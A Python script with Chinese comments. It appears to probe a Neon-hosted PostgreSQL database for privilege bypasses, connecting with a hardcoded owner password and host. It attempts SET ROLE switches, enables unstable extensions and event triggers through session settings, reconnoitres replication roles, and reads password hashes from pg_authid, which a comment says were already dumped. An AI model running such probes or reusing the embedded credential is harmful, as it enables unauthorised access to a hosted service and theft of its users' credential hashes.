# -*- coding: utf-8 -*-
"""USERSET 参数绕过测试 + 事件触发器权限 + SET ROLE 确认
全事务回滚零破坏"""
import psycopg

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI = 'postgresql://neondb_owner:%s@%s/neondb' % (PWD, HOST)
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def step(tag, sql=None):
    if sql is None:
        sql = tag
    try:
        cur.execute('BEGIN')
    except Exception:
        pass
    try:
        cur.execute(sql)
        cur.execute('ROLLBACK')
        return 'OK'
    except Exception as e:
        try:
            cur.execute('ROLLBACK')
        except Exception:
            pass
        return 'ERR: %s' % str(e)[:250]

def step2(tag, sql=None):
    """BEGIN 内执行返回结果再回滚"""
    if sql is None:
        sql = tag
    try:
        cur.execute('BEGIN')
    except Exception:
        pass
    try:
        cur.execute(sql)
        r = cur.fetchall()
        cur.execute('ROLLBACK')
        return r
    except Exception as e:
        try:
            cur.execute('ROLLBACK')
        except Exception:
            pass
        return 'ERR: %s' % str(e)[:250]

print('=== [1] SET ROLE 确认(独立语句, 全捕获) ===')
for r in ('anonymous', 'authenticated', 'neon_auth'):
    try:
        cur.execute('BEGIN')
        cur.execute('SET ROLE %s' % r)
        cur.execute('SELECT current_user, session_user')
        who = cur.fetchall()
        try:
            cur.execute('SELECT count(*) FROM neon_auth."user"')
            na = cur.fetchall()
        except Exception as e:
            na = 'DENIED: %s' % str(e)[:120]
        try:
            cur.execute('SELECT count(*) FROM pg_authid')
            pa = cur.fetchall()
        except Exception as e:
            pa = 'DENIED: %s' % str(e)[:120]
        try:
            cur.execute("SELECT pg_get_userbyid(oid) FROM pg_roles WHERE rolname='pg_read_all_data'")
            pra = cur.fetchall()
        except Exception as e:
            pra = 'DENIED: %s' % str(e)[:120]
        cur.execute('ROLLBACK')
        print('SET ROLE %s: %s | neon_auth.user=%s | pg_authid=%s' % (r, who, na, pa))
    except Exception as e:
        try:
            cur.execute('ROLLBACK')
        except Exception:
            pass
        print('SET ROLE %s: ERR %s' % (r, str(e)[:200]))

print('\n=== [2] SET neon.allow_unstable_extensions + CREATE EXTENSION pg_search ===')
print('SET on:', step("SET neon.allow_unstable_extensions = 'on'"))
print('CREATE EXTENSION pg_search(SET on 同事务):', step("SET neon.allow_unstable_extensions='on'; CREATE EXTENSION IF NOT EXISTS pg_search"))
print('默认 CREATE(SET off):', step("SET neon.allow_unstable_extensions='off'; CREATE EXTENSION IF NOT EXISTS pg_search"))
print('不 SET 直接 CREATE:', step('CREATE EXTENSION IF NOT EXISTS pg_search'))
print('默认值:', step2("SELECT setting FROM pg_settings WHERE name='neon.allow_unstable_extensions'"))

print('\n=== [3] CREATE EVENT TRIGGER 直接测试(函数体内部逐项) ===')
print(step("""CREATE OR REPLACE FUNCTION k_evt() RETURNS event_trigger AS $$ BEGIN NULL; END $$ LANGUAGE plpgsql"""))
print(step("""CREATE EVENT TRIGGER k_evt_trg ON ddl_command_end EXECUTE FUNCTION k_evt()"""))
print(step('DROP EVENT TRIGGER IF EXISTS k_evt_trg'))
print(step('DROP FUNCTION IF EXISTS k_evt()'))

print('\n=== [4] SET neon.event_triggers 后再试 ===')
print('SET:', step("SET neon.event_triggers = 'on'"))
print(step("""CREATE OR REPLACE FUNCTION k_evt2() RETURNS event_trigger AS $$ BEGIN NULL; END $$ LANGUAGE plpgsql"""))
print(step("""CREATE EVENT TRIGGER k_evt2_trg ON ddl_command_end EXECUTE FUNCTION k_evt2()"""))
print(step('DROP EVENT TRIGGER IF EXISTS k_evt2_trg'))
print(step('DROP FUNCTION IF EXISTS k_evt2()'))
print('SET off:', step("SET neon.event_triggers='off'"))

print('\n=== [5] 复制协议面侦察(角色属性) ===')
print(step2("""SELECT rolname, rolreplication FROM pg_roles
               WHERE rolreplication AND rolcanlogin"""))

print('\n=== [6] pg_stat_replication 视角(有无现成 wal_sender) ===')
print(step2("SELECT count(*) FROM pg_stat_replication"))

print('\n=== [7] pg_authid 完整哈希(neondb 库, 已 dump 过; 这里确认可读性) ===')
print(step2("SELECT rolname, left(rolpassword, 40) FROM pg_authid WHERE rolpassword IS NOT NULL"))

conn.close()
